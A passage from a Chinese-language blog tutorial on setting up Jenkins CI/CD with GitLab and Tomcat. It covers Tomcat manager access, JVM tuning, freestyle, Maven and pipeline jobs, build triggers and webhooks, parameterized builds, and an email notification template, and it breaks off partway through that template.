&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;!-- 为了能够刚才配置的用户登录到Tomcat，还需要修改以下配置 --&amp;gt;
&amp;lt;!-- 进入 webapps/manager/META-INF/context.xml,注释掉下面代码 --&amp;gt;

&amp;lt;!-- 
&amp;lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot; allow=&quot;127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1&quot; /&amp;gt; 
--&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;重启Tomcat，访问测试&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142706855-147724694.png&quot; alt=&quot;image-20210110040411004&quot;/&gt;&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;Tomcat调优，调整Jvm内存大小（解决后端项目无端部署失败的bug）&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;由于公司项目体积较大，我多次使用Jenkins自动部署项目都失败了，但是代码并无明显错误。后来发现是tomcat的jvm设置太小容易内存溢出，可以适当调整jvm内存大下，重启下即可。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;使用刚才创建的角色进入manager应用，点击Server Status查看JVM状态&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110165853087-309371897.png&quot; alt=&quot;&quot;/&gt;&lt;ul&gt;&lt;li&gt;修改JVM内存大小&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;修改方式：打开Tomcat的bin/catalina.bat文件进行修改&lt;/p&gt;
&lt;p&gt;注意：内存不宜设置太大，根据服务器内存大小适当配置&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;增大堆内存&lt;/p&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110165935084-466248681.png&quot; alt=&quot;&quot;/&gt;&lt;p&gt;增大非堆内存&lt;/p&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110170004200-1490054192.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;5-jenkins各种类型项目构建&quot;&gt;5. Jenkins各种类型项目构建&lt;/h4&gt;
&lt;h5 id=&quot;51-自动构建项目类型&quot;&gt;5.1 自动构建项目类型&lt;/h5&gt;
&lt;p&gt;Jenkins中自动构建项目的类型有很多，常用的有以下三种：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;自由风格软件项目（FreeStyle Project）&lt;/li&gt;
&lt;li&gt;Maven项目（Maven Project）&lt;/li&gt;
&lt;li&gt;流水线项目（Pipeline Project）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;每种类型的构建其实都可以完成一样的构建过程与结果，只是在操作方式、灵活度等方面有所区别，在实际开发中可以根据自己的需求和习惯来选择。（PS：个人推荐使用流水线类型，因为灵活度非常高）&lt;/p&gt;
&lt;h5 id=&quot;52-自由风格项目搭建&quot;&gt;5.2 自由风格项目搭建&lt;/h5&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;演示集成过程：拉取代码 -&amp;gt; 编译 -&amp;gt; 打包 -&amp;gt; 部署&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;&lt;li&gt;创建自由风格项目web_test2&lt;/li&gt;
&lt;li&gt;配置源码管理，从GitLab拉取代码&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142735519-1774164614.png&quot; alt=&quot;image-20210110094018780&quot;/&gt;&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;编译打包&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142812487-2094157622.png&quot; alt=&quot;image-20210110091925493&quot;/&gt;&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;部署&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;把项目部署到远程的Tomcat里面&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;安装 &lt;code&gt;Deploy to container&lt;/code&gt;插件。Jenkins本身无法实现远程部署到Tomcat的功能，需要安装Deploy to container插件实现&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142844398-899863642.png&quot; alt=&quot;image-20210110092550846&quot;/&gt;&lt;ul&gt;&lt;li&gt;添加Tomcat用户凭证&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142922157-943986436.png&quot; alt=&quot;image-20210110092757022&quot;/&gt;&lt;ul&gt;&lt;li&gt;添加构建后操作&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142941535-1201529260.png&quot; alt=&quot;image-20210110092427472&quot;/&gt;&lt;ul&gt;&lt;li&gt;点击Build Now，开始构建过程&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110143005388-236917562.png&quot; alt=&quot;image-20210110094128822&quot;/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110143022980-980151282.png&quot; alt=&quot;image-20210110094204122&quot;/&gt;&lt;ul&gt;&lt;li&gt;之后改动代码再push到GitLab，在Jenkins中对项目进行重新构建部署即可&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;53-maven项目搭建&quot;&gt;5.3 Maven项目搭建&lt;/h5&gt;
&lt;ol&gt;&lt;li&gt;安装Maven Integration插件&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110143045384-189939148.png&quot; alt=&quot;image-20210110094441917&quot;/&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;创建Maven项目web_test2_maven&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110143108518-74189671.png&quot; alt=&quot;image-20210110094838925&quot;/&gt;&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;配置项目&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;拉取代码和远程部署的过程和自由风格项目一样，只是&quot;构建&quot;部分不同&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110143131870-1337316687.png&quot; alt=&quot;image-20210110095048285&quot;/&gt;&lt;h5 id=&quot;54-流水线项目搭建&quot;&gt;5.4 流水线项目搭建&lt;/h5&gt;
&lt;ol&gt;&lt;li&gt;Pipeline简介&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Pipeline，简单来说就是一套运行在 Jenkins 上的工作流框架，将原来独立运行于单个或者多个节点的任务连接起来，实现单个任务难以完成的复杂流程编排和可视化的工作。&lt;/p&gt;
&lt;p&gt;使用Pipeline有以下好处：&lt;/p&gt;
&lt;ul readability=&quot;3.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;代码：Pipeline以代码的形式实现，通常被检入源代码控制，使团队能够编辑，审查和迭代其传送流程。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;持久：无论是计划内的还是计划外的服务器重启，Pipeline都是可恢复的。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;可停止：Pipeline可接收交互式输入，以确定是否继续执行Pipeline。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;多功能：Pipeline支持现实世界中复杂的持续交付要求。它支持fork/join、循环执行，并行执行任务的功能。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;可扩展：Pipeline插件支持其DSL的自定义扩展 ，以及与其他插件集成的多个选项。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;如何创建 Jenkins Pipeline？&lt;/p&gt;
&lt;ul readability=&quot;1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Pipeline 脚本是由 &lt;strong&gt;Groovy&lt;/strong&gt; 语言实现的，但是我们没必要单独去学习 Groovy&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Pipeline 支持两种语法：&lt;strong&gt;Declarative&lt;/strong&gt;(声明式)和 &lt;strong&gt;Scripted Pipeline&lt;/strong&gt;(脚本式)语法&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;Pipeline 也有两种创建方法：可以直接在 Jenkins 的 Web UI 界面中输入脚本；也可以通过创建一个 Jenkinsfifile 脚本文件放入项目源码库中（一般都推荐在 Jenkins 中直接从源代码控制(SCM)中直接载入 Jenkinsfifile Pipeline 这种方法）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;安装Pipeline插件&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110143154046-236694077.png&quot; alt=&quot;image-20210110095437371&quot;/&gt;&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;安装插件后，创建项目的时候多了“流水线”类型&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110143218059-1270607670.png&quot; alt=&quot;image-20210110095651694&quot;/&gt;&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;Pipeline语法快速入门&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;Declarative声明式-Pipeline&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;流水线-&amp;gt;选择HelloWorld模板&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110143316547-42987278.png&quot; alt=&quot;image-20210110100122204&quot;/&gt;&lt;blockquote readability=&quot;12&quot;&gt;
&lt;p&gt;生成内容如下&lt;/p&gt;
&lt;p&gt;stages：代表整个流水线的所有执行阶段。通常stages只有1个，里面包含多个stage&lt;/p&gt;
&lt;p&gt;stage：代表流水线中的某个阶段，可能出现n个。一般分为拉取代码，编译构建，部署等阶段。&lt;/p&gt;
&lt;p&gt;steps：代表一个阶段内需要执行的逻辑。steps里面是shell脚本，git拉取代码，ssh远程发布等任意内容。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;pipeline {
    agent any

    stages {
        stage('Hello') {
            steps {
                echo 'Hello World'
            }
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;编写一个简单声明式的Pipeline&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;pipeline { 
        agent any 
        stages { 
        
                stage('拉取代码') { 
                        steps { 
                                echo '拉取代码' 
                        } 
                }
                
                stage('编译构建') { 
                        steps { 
                                echo '编译构建'
                        } 
                }
                
                stage('项目部署') { 
                        steps { 
                                echo '项目部署' 
                        } 
                } 
        } 
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;点击构建，可以看到整个构建过程&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110143340310-1651210210.png&quot; alt=&quot;image-20210110100631651&quot;/&gt;&lt;ul&gt;&lt;li&gt;Scripted Pipeline脚本式-Pipeline&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;流水线-&amp;gt;选择Scripted Pipeline&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110143412052-40420202.png&quot; alt=&quot;image-20210110100855260&quot;/&gt;&lt;blockquote readability=&quot;13&quot;&gt;
&lt;p&gt;生成内容如下&lt;/p&gt;
&lt;p&gt;Node：节点，一个 Node 就是一个 Jenkins 节点，Master 或者 Agent，是执行 Step 的具体运行环境，后续讲到Jenkins的Master-Slave架构的时候用到。&lt;/p&gt;
&lt;p&gt;Stage：阶段，一个 Pipeline 可以划分为若干个 Stage，每个 Stage 代表一组操作，比如：Build、Test、Deploy，Stage 是一个逻辑分组的概念。&lt;/p&gt;
&lt;p&gt;Step：步骤，Step 是最基本的操作单元，可以是打印一句话，也可以是构建一个 Docker 镜像，由各类 Jenkins 插件提供，比如命令：sh ‘make’，就相当于我们平时 shell 终端中执行 make 命令&lt;/p&gt;
&lt;p&gt;一样&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;node {
    def mvnHome
    stage('Preparation') { 
        
    }
    stage('Build') {
        
    }
    stage('Results') {
        
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;我们可以通过左下侧流水线语法快速生成pipeline代码&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;以拉取代码为例，选择片段生成器模板&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110145758678-1407824930.png&quot; alt=&quot;image-20210110101327060&quot;/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110145821717-1613700417.png&quot; alt=&quot;image-20210110101550186&quot;/&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;pipeline {
    agent any

    stages {
        stage('拉取代码') {
            steps {
                checkout([$class: 'GitSCM', branches: [[name: '*/master']], 
                doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [],
                userRemoteConfigs: [[credentialsId: '0c93f73d-1e42-4d39-a8ab-f07d5dda668f',
                url: 'ssh://git@192.168.0.200:2222/DianJianQiJu/web_test2.git']]])
            }
        }
        stage('编译打包') {
            steps {
                sh label: '', script: 'mvn clean package'
            }
        }
        stage('项目部署') {
            steps {
                deploy adapters: [tomcat8(credentialsId: '22b62c37-4009-4ac3-b82b-fbf926a0cc63', path: '',
                url: 'http://8.136.103.128:8085')], contextPath: null, war: 'target/*.war'
            }
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;Pipeline Script from SCM&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;刚才我们都是直接在Jenkins的UI界面编写Pipeline代码，这样不方便脚本维护，建议把Pipeline脚本放在项目中（一起进行版本控制），在项目根目录建立Jenkinsfifile文件，把脚本内容复制到该文件中即可&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110145847732-1890972548.png&quot; alt=&quot;image-20210110102351961&quot;/&gt;&lt;h4 id=&quot;6-jenkins构建触发器&quot;&gt;6. Jenkins构建触发器&lt;/h4&gt;
&lt;h5 id=&quot;61-jenkins内置4种构建触发器&quot;&gt;6.1 Jenkins内置4种构建触发器&lt;/h5&gt;
&lt;h5 id=&quot;62-触发远程构建演示&quot;&gt;6.2 触发远程构建演示&lt;/h5&gt;
&lt;p&gt;触发构建url：&lt;a href=&quot;http://192.168.0.200:8888/job/web_test2/build?token=123456&quot; target=&quot;_blank&quot;&gt;http://192.168.0.200:8888/job/web_test2/build?token=123456&lt;/a&gt;&lt;/p&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110145911187-74701917.png&quot; alt=&quot;image-20210110103123388&quot;/&gt;&lt;h5 id=&quot;63-其他工程构建后触发&quot;&gt;6.3 其他工程构建后触发&lt;/h5&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110145931718-219926976.png&quot; alt=&quot;image-20210110103406753&quot;/&gt;&lt;h5 id=&quot;64-定时构建&quot;&gt;6.4 定时构建&lt;/h5&gt;
&lt;ul&gt;&lt;li&gt;定时字符串从左往右分别为： 分 时 日 月 周&lt;/li&gt;
&lt;li&gt;一些定时表达式的例子：&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;23&quot;&gt;
&lt;p&gt;每30分钟构建一次：H代表形参 H/30 * * * * 10:02 10:32&lt;/p&gt;
&lt;p&gt;每2个小时构建一次: H H/2 * * *&lt;/p&gt;
&lt;p&gt;每天的8点, 12点, 22点，一天构建3次： (多个时间点中间用逗号隔开) 0 8,12,22 * * *&lt;/p&gt;
&lt;p&gt;每天中午12点定时构建一次 H 12 * * *&lt;/p&gt;
&lt;p&gt;每天下午18点定时构建一次 H 18 * * *&lt;/p&gt;
&lt;p&gt;在每个小时的前半个小时内的每10分钟 H(0-29)/10 * * * *&lt;/p&gt;
&lt;p&gt;每两小时一次，每个工作日上午9点到下午5点(也许是上午10:38，下午12:38，下午2:38，下午4:38) H H(9-16)/2 * * 1-5&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110145956322-1866273217.png&quot; alt=&quot;image-20210110103535689&quot;/&gt;&lt;h5 id=&quot;65-轮询scm&quot;&gt;6.5 轮询SCM&lt;/h5&gt;
&lt;p&gt;轮询SCM，是指定时扫描本地代码仓库的代码是否有变更，如果代码有变更就触发项目构建。&lt;/p&gt;
&lt;p&gt;注意：这次构建触发器，Jenkins会定时扫描本地整个项目的代码，增大系统的开销，不建议使用。&lt;/p&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150035248-353776999.png&quot; alt=&quot;image-20210110104737747&quot;/&gt;&lt;h5 id=&quot;66-git-hook自动触发构建插件&quot;&gt;6.6 Git hook自动触发构建插件&lt;/h5&gt;
&lt;ol&gt;&lt;li&gt;刚才我们看到在Jenkins的内置构建触发器中，轮询SCM可以实现Gitlab代码更新，项目自动构建，但是该方案的性能不佳。那有没有更好的方案呢？ 有的。就是利用Gitlab的webhook实现代码push到仓库，立即触发项目自动构建。&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150056357-1100900273.png&quot; alt=&quot;image-20210110104312235&quot;/&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;安装GitLab Hook插件：Gitlab Hook 与 GitLab两个插件&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150124819-1626866352.png&quot; alt=&quot;image-20210110104507071&quot;/&gt;&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;Jenkins设置自动构建&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150146903-78013051.png&quot; alt=&quot;image-20210110104909770&quot;/&gt;&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;GitLab配置webhook&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;开启webhook功能&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;使用root账户登录到后台，点击Admin Area -&amp;gt; Settings&lt;/p&gt;
&lt;p&gt;勾选&quot;允许钩子和服务访问本地网络&quot;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150326588-826139126.png&quot; alt=&quot;image-20210110105138792&quot;/&gt;&lt;ul&gt;&lt;li&gt;在项目中添加webhook&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150352635-17158949.png&quot; alt=&quot;image-20210110105446860&quot;/&gt;&lt;ul&gt;&lt;li&gt;注意：以下设置必须完成，否则会报错！&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150417174-1338735081.png&quot; alt=&quot;image-20210110105630756&quot;/&gt;&lt;h4 id=&quot;7-jenkins参数化构建&quot;&gt;7. Jenkins参数化构建&lt;/h4&gt;
&lt;h5 id=&quot;71-理解&quot;&gt;7.1 理解&lt;/h5&gt;
&lt;p&gt;有时在项目构建的过程中，我们需要根据用户的输入动态传入一些参数，从而影响整个构建结果，这时我们可以使用参数化构建。&lt;/p&gt;
&lt;p&gt;Jenkins支持非常丰富的参数类型。&lt;/p&gt;
&lt;h5 id=&quot;72-演示通过分支名称来部署不同分支项目&quot;&gt;7.2 演示通过分支名称来部署不同分支项目&lt;/h5&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;流水线项目作为演示&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;&lt;li&gt;项目创建分支，并推送到Gitlab上&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150448562-268434861.png&quot; alt=&quot;image-20210110110424748&quot;/&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;在Jenkins项目配置中添加字符串类型参数&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150509722-667881555.png&quot; alt=&quot;image-20210110110624415&quot;/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150531891-611081822.png&quot; alt=&quot;image-20210110110750738&quot;/&gt;&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;修改pipeline流水线拉取步骤的代码&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150555581-215242745.png&quot; alt=&quot;image-20210110111429375&quot;/&gt;&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;点击Build with Parameters&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;输入分支名称构建即可！构建完成后访问Tomcat查看结果&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150639073-733312613.png&quot; alt=&quot;image-20210110111553860&quot;/&gt;&lt;h4 id=&quot;8-jenkins配置邮箱服务器发送构建结果&quot;&gt;8. Jenkins配置邮箱服务器发送构建结果&lt;/h4&gt;
&lt;h5 id=&quot;81-安装email-extension-plugin插件&quot;&gt;8.1 安装Email Extension Plugin插件&lt;/h5&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150709166-1402525706.png&quot; alt=&quot;image-20210110120925380&quot;/&gt;&lt;h5 id=&quot;82-jenkins设置邮箱相关参数&quot;&gt;8.2 Jenkins设置邮箱相关参数&lt;/h5&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Manage Jenkins -&amp;gt; Confifigure System&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;&lt;li&gt;设置管理员邮箱&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150735762-565708408.png&quot; alt=&quot;image-20210110111840639&quot;/&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;设置邮件参数&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150755200-33550358.png&quot; alt=&quot;image-20210110121649762&quot;/&gt;&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;设置Jenkins默认邮箱信息&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150814841-676714521.png&quot; alt=&quot;image-20210110112321447&quot;/&gt;&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;准备邮件内容（模板）&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;在项目根目录编写email.html，并把文件推送到Gitlab，内容如下：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
&amp;lt;title&amp;gt;${ENV, var=&quot;JOB_NAME&quot;}-第${BUILD_NUMBER}次构建日志&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
 
&amp;lt;body leftmargin=&quot;8&quot; marginwidth=&quot;0&quot; topmargin=&quot;8&quot; marginheight=&quot;4&quot;
    offset=&quot;0&quot;&amp;gt;
    &amp;lt;table width=&quot;95%&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;
        style=&quot;font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sans-serif&quot;&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;(本邮件是Jenkins程序自动下发的，请勿回复！)&amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;&amp;lt;h2&amp;gt;&amp;lt;font color=&quot;#0000FF&quot;&amp;gt;构建结果 - ${BUILD_STATUS}&amp;lt;/font&amp;gt;&amp;lt;/h2&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;&amp;lt;br /&amp;gt;
            &amp;lt;b&amp;gt;&amp;lt;font color=&quot;#0B610B&quot;&amp;gt;构建信息：&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;hr size=&quot;2&quot; width=&quot;100%&quot; align=&quot;center&quot; /&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;
                &amp;lt;ul&amp;gt;
                    &amp;lt;li&amp;gt;项目名称：${PROJECT_NAME}&amp;lt;/li&amp;gt;
                    &amp;lt;li&amp;gt;构建编号：第${BUILD_NUMBER}次构建&amp;lt;/li&amp;gt;
                    &amp;lt;!--
                    &amp;lt;li&amp;gt;SVN 版本： ${SVN_REVISION}&amp;lt;/li&amp;gt;
                    --&amp;gt;
                    &amp;lt;li&amp;gt;触发原因：${CAUSE}&amp;lt;/li&amp;gt;
                    &amp;lt;li&amp;gt;构建日志：&amp;lt;a href=&quot;${BUILD_URL}console&quot;&amp;gt;${BUILD_URL}console&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
                    &amp;lt;li&amp;gt;构建地址：&amp;lt;a href=&quot;${BUILD_URL}&quot;&amp;gt;${BUILD_URL}&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
                    &amp;lt;li&amp;gt;工作目录：&amp;lt;a href=&quot;${PROJECT_URL}ws&quot;&amp;gt;${PROJECT_URL}ws&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
                    &amp;lt;li&amp;gt;项目地址：&amp;lt;a href=&quot;${PROJECT_URL}&quot;&amp;gt;${PROJECT_URL}&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
                    &amp;lt;li&amp;gt;变更集：${JELLY_SCRIPT,template=&quot;html&quot;}&amp;lt;/li&amp;gt;
                &amp;lt;/ul&amp;gt;
            &amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&amp;lt;font color=&quot;#0B610B&quot;&amp;gt;Changes Since Last Successful Build:&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;hr size=&quot;2&quot; width=&quot;100%&quot; align=&quot;center&quot; /&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;
                &amp;lt;ul&amp;gt;
                    &amp;lt;li&amp;gt;历史变更记录 : &amp;lt;a href=&quot;${PROJECT_URL}changes&quot;&amp;gt;${PROJECT_URL}changes&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
                &amp;lt;/ul&amp;gt; ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format=&quot;Changes for Build #%n:&amp;lt;br /&amp;gt;%c&amp;lt;br /&amp;gt;&quot;,showPaths=true,changesFormat=&quot;&amp;lt;pre&amp;gt;[%a]&amp;lt;br /&amp;gt;%m&amp;lt;/pre&amp;gt;&quot;,pathFormat=&quot;%p&quot;}
            &amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&amp;lt;font color=&quot;#0B610B&quot;&amp;gt;Failed Test Results：&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;hr size=&quot;2&quot; width=&quot;100%&quot; align=&quot;center&quot; /&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
